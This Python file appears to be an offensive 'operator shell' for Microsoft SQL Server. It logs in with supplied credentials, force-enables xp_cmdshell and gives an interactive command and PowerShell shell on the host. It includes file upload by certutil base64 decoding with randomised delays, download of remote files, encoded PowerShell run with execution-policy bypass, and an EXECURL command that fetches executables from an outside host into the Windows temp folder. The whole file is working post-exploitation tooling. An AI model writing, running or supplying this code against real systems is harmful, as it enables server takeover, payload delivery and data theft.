#!/usr/bin/env python3
from __future__ import print_function


try:
    import _mssql
except:
    from pymssql import _mssql

import os
import sys
import base64
import shlex
import tqdm
import time
import random
import hashlib
import argparse
import readline
import atexit
from io import open

try:
    input = raw_input
except NameError:
    pass

# ---------------------------------
# Config
# ---------------------------------

BUFFER_SIZE = 5 * 1024
QUERY_TIMEOUT = 30
HISTFILE = "/tmp/.mssql_shell_history"

COMMANDS = [
    "UPLOAD",
    "DOWNLOAD",
    "PS",
    "PSSHELL",
    "EXECURL",
    "cd",
    "exit"
]

# ---------------------------------
# Readline History
# ---------------------------------

try:
    readline.read_history_file(HISTFILE)
except FileNotFoundError:
    pass

atexit.register(readline.write_history_file, HISTFILE)

# ---------------------------------
# Auto-completion
# ---------------------------------


def completer(text, state):
    options = [
        cmd for cmd in COMMANDS
        if cmd.startswith(text.upper())
    ]

    if state < len(options):
        return options[state]

    return None


readline.set_completer(completer)
readline.parse_and_bind("tab: complete")

# ---------------------------------
# Args
# ---------------------------------

parser = argparse.ArgumentParser(
    description="Enhanced MSSQL xp_cmdshell operator shell"
)

parser.add_argument(
    "-S", "--server",
    required=True,
    help="MSSQL server/IP"
)

parser.add_argument(
    "-U", "--username",
    required=True,
    help="Username"
)

parser.add_argument(
    "-P", "--password",
    required=True,
    help="Password"
)

args = parser.parse_args()

MSSQL_SERVER = args.server
MSSQL_USERNAME = args.username
MSSQL_PASSWORD = args.password

# ---------------------------------
# Helpers
# ---------------------------------


def sanitize_cmd(cmd):
    return (
        cmd
        .replace("^", "^^")
        .replace("&", "^&")
        .replace("|", "^|")
        .replace(">", "^>")
        .replace("<", "^<")
        .replace("'", "''")
    )



def powershell_encode(cmd):
    return base64.b64encode(
        cmd.encode("utf-16le")
    ).decode()



def build_wrapper(cmd, cwd):
    return (
        f"cd /d {cwd} & "
        f"echo __START__ & "
        f"{cmd} & "
        f"echo %username%^|%COMPUTERNAME% & "
        f"cd & "
        f"echo __END__"
    )



def process_result(mssql):
    username = ""
    computername = ""
    cwd = ""

    rows = list(mssql)

    output = []
    capture = False

    for row in rows:
        val = row[list(row)[-1]]

        if not val:
            continue

        val = val.strip()

        if val == "__START__":
            capture = True
            continue

        if val == "__END__":
            break

        if capture:
            output.append(val)

    if len(output) >= 2:
        try:
            username, computername = output[-2].split("|")
            cwd = output[-1]
            cmd_output = output[:-2]
        except:
            cmd_output = output
    else:
        cmd_output = output

    for line in cmd_output:
        print(line)

    return (
        username.rstrip(),
        computername.rstrip(),
        cwd.rstrip()
    )


# ---------------------------------
# Upload
# ---------------------------------


def upload(mssql, stored_cwd, local_path, remote_path):
    print(f"[+] Uploading {local_path} -> {remote_path}")

    cmd = f'type nul > "{remote_path}.b64"'

    mssql.execute_query(
        f"EXEC xp_cmdshell '{cmd}'"
    )

    with open(local_path, 'rb') as f:
        data = f.read()

    md5sum = hashlib.md5(data).hexdigest()

    b64enc_data = b"".join(
        base64.encodebytes(data).split()
    ).decode()

    print(f"[+] Base64 size: {round(len(b64enc_data)/1024, 2)} KB")

    for i in tqdm.tqdm(
        range(0, len(b64enc_data), BUFFER_SIZE),
        unit_scale=BUFFER_SIZE / 1024,
        unit="KB"
    ):

        chunk = b64enc_data[i:i + BUFFER_SIZE]

        cmd = f'echo {chunk} >> "{remote_path}.b64"'

        mssql.execute_query(
            f"EXEC xp_cmdshell '{cmd}'"
        )

        time.sleep(random.uniform(0.05, 0.2))

    cmd = (
        f'certutil -decode '
        f'"{remote_path}.b64" '
        f'"{remote_path}"'
    )

    wrapper = build_wrapper(cmd, stored_cwd)

    mssql.execute_query(
        f"EXEC xp_cmdshell '{wrapper}'"
    )

    process_result(mssql)

    cmd = f'certutil -hashfile "{remote_path}" MD5'

    wrapper = build_wrapper(cmd, stored_cwd)

    mssql.execute_query(
        f"EXEC xp_cmdshell '{wrapper}'"
    )

    hashes = []

    for row in mssql:
        val = row[list(row)[-1]]

        if val:
            hashes.append(val.strip())

    if md5sum in hashes:
        print(f"[+] MD5 hashes match: {md5sum}")
    else:
        print("[-] MD5 mismatch")


# ---------------------------------
# Download
# ---------------------------------


def download(mssql, remote_path, local_path):
    print(f"[+] Downloading {remote_path} -> {local_path}")

    b64_tmp = remote_path + ".b64"

    cmd = (
        f'certutil -encode '
        f'"{remote_path}" '
        f'"{b64_tmp}"'
    )

    mssql.execute_query(
        f"EXEC xp_cmdshell '{cmd}'"
    )

    cmd = f'type "{b64_tmp}"'

    mssql.execute_query(
        f"EXEC xp_cmdshell '{cmd}'"
    )

    data = []

    for row in mssql:
        val = row[list(row)[-1]]

        if not val:
            continue

        val = val.strip()

        # Skip certutil junk
        if (
            "BEGIN CERTIFICATE" in val or
            "END CERTIFICATE" in val or
            "CertUtil:" in val or
            "Input Length" in val or
            "Output Length" in val
        ):
            continue

        # Keep only valid base64 lines
        if all(
            c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
            for c in val
        ):
            data.append(val)

    decoded = base64.b64decode("".join(data))

    with open(local_path, "wb") as f:
        f.write(decoded)

    print(f"[+] Download completed: {local_path}")


# ---------------------------------
# PowerShell Interactive
# ---------------------------------


def powershell_shell(mssql):
    while True:
        try:
            ps = input("PS> ")

            if ps.lower() == "exit":
                break

            clean_ps = (
                "$ProgressPreference='SilentlyContinue'; "
                + ps
            )

            encoded = powershell_encode(clean_ps)

            ps_exec = (
                "powershell "
                "-NoLogo "
                "-NonInteractive "
                "-NoProfile "
                "-ExecutionPolicy Bypass "
                f"-enc {encoded}"
            )

            mssql.execute_query(
                f"EXEC xp_cmdshell '{ps_exec}'"
            )

            for row in mssql:
                val = row[list(row)[-1]]

                if val:
                    val = val.strip()

                    # Skip CLIXML garbage
                    if (
                        val.startswith("#<") or
                        val.startswith("<Objs") or
                        val.startswith("</Objs>")
                    ):
                        continue

                    print(val)

        except KeyboardInterrupt:
            break


# ---------------------------------
# Main Shell
# ---------------------------------


def shell():
    mssql = None
    stored_cwd = "C:\\"

    try:
        print(f"[+] Connecting to {MSSQL_SERVER}...")

        mssql = _mssql.connect(
            server=MSSQL_SERVER,
            user=MSSQL_USERNAME,
            password=MSSQL_PASSWORD,
        )

        print(
            f"[+] Successful login: "
            f"{MSSQL_USERNAME}@{MSSQL_SERVER}"
        )

        print("[+] Attempting to enable xp_cmdshell...")

        try:
            mssql.execute_query(
                "EXEC sp_configure 'show advanced options',1;"
                "RECONFIGURE;"
                "EXEC sp_configure 'xp_cmdshell',1;"
                "RECONFIGURE"
            )

            print("[+] xp_cmdshell enabled")

        except Exception:
            print("[!] Could not enable xp_cmdshell")

        wrapper = build_wrapper("echo ready", stored_cwd)

        mssql.execute_query(
            f"EXEC xp_cmdshell '{wrapper}'"
        )

        username, computername, cwd = process_result(mssql)

        if cwd:
            stored_cwd = cwd

        while True:
            try:
                prompt = (
                    f"\033[1;31m"
                    f"{username}@{computername}"
                    f"\033[0m:"
                    f"\033[1;34m"
                    f"{stored_cwd}"
                    f"\033[0m$ "
                )

                cmd = input(prompt).rstrip("\n")

                if not cmd:
                    cmd = "call"

                # Exit
                if cmd.lower().startswith("exit"):
                    print("[+] Closing connection...")
                    mssql.close()
                    return

                # CD
                elif cmd.lower().startswith("cd"):
                    target = cmd[2:].strip()

                    if not target:
                        target = stored_cwd

                    mssql.execute_query(
                        f"EXEC xp_cmdshell 'cd /d \"{target}\" & cd'"
                    )

                    rows = list(mssql)

                    for row in rows:
                        val = row[list(row)[-1]]

                        if val:
                            stored_cwd = val.strip()

                    continue

                # Upload
                elif cmd.upper().startswith("UPLOAD"):
                    upload_cmd = shlex.split(cmd, posix=False)

                    if len(upload_cmd) < 2:
                        print(
                            "Usage: UPLOAD local_path [remote_path]"
                        )
                        continue

                    if len(upload_cmd) < 3:
                        remote_path = (
                            stored_cwd + "\\" + upload_cmd[1]
                        )
                    else:
                        remote_path = upload_cmd[2]

                    upload(
                        mssql,
                        stored_cwd,
                        upload_cmd[1],
                        remote_path
                    )

                    continue

                # Download
                elif cmd.upper().startswith("DOWNLOAD"):
                    dl_cmd = shlex.split(cmd, posix=False)

                    if len(dl_cmd) < 2:
                        print(
                            "Usage: DOWNLOAD remote_path [local_path]"
                        )
                        continue

                    remote_path = dl_cmd[1]

                    if len(dl_cmd) >= 3:
                        local_path = dl_cmd[2]
                    else:
                        local_path = os.path.basename(remote_path)

                    download(
                        mssql,
                        remote_path,
                        local_path
                    )

                    continue

                # PS one-liner — handle output directly with CLIXML filtering
                elif cmd.startswith("PS "):
                    ps_cmd = cmd[3:]

                    clean_ps = (
                        "$ProgressPreference='SilentlyContinue'; "
                        + ps_cmd
                    )

                    encoded = powershell_encode(clean_ps)

                    ps_exec = (
                        "powershell "
                        "-NoLogo "
                        "-NonInteractive "
                        "-NoProfile "
                        "-ExecutionPolicy Bypass "
                        f"-enc {encoded}"
                    )

                    mssql.execute_query(
                        f"EXEC xp_cmdshell '{ps_exec}'"
                    )

                    for row in mssql:
                        val = row[list(row)[-1]]

                        if val:
                            val = val.strip()

                            # Skip CLIXML garbage
                            if (
                                val.startswith("#<") or
                                val.startswith("<Objs") or
                                val.startswith("</Objs>") or
                                val.startswith("<S S=")
                            ):
                                continue

                            print(val)

                    continue

                # Interactive PS shell
                elif cmd.upper() == "PSSHELL":
                    powershell_shell(mssql)
                    continue

                # EXECURL
                elif cmd.upper().startswith("EXECURL"):
                    parts = shlex.split(cmd, posix=False)

                    if len(parts) != 2:
                        print(
                            "Usage: EXECURL http://host/file.exe"
                        )
                        continue

                    url = parts[1]
                    filename = url.split("/")[-1]

                    # FIX 2: cmd assignment moved outside the length guard, at correct indent
                    cmd = (
                        f'certutil -urlcache -split -f '
                        f'{url} '
                        f'C:\\Windows\\Temp\\{filename}'
                    )

                cmd = sanitize_cmd(cmd)

                wrapper = build_wrapper(
                    cmd,
                    stored_cwd
                )

                mssql.execute_query(
                    f"EXEC xp_cmdshell '{wrapper}'"
                )

                username, computername, cwd = process_result(mssql)

                if cwd:
                    stored_cwd = cwd

            except KeyboardInterrupt:
                print("\n[!] Use 'exit' to quit")

    except _mssql.MssqlDatabaseException as e:
        if e.severity <= 16:
            print(f"[-] MSSQL failed: {e}")
        else:
            raise

    except Exception as e:
        print(f"[-] Error: {e}")

    finally:
        if mssql:
            mssql.close()


# ---------------------------------
# Entry Point
# ---------------------------------

if __name__ == "__main__":
    shell()
    sys.exit()
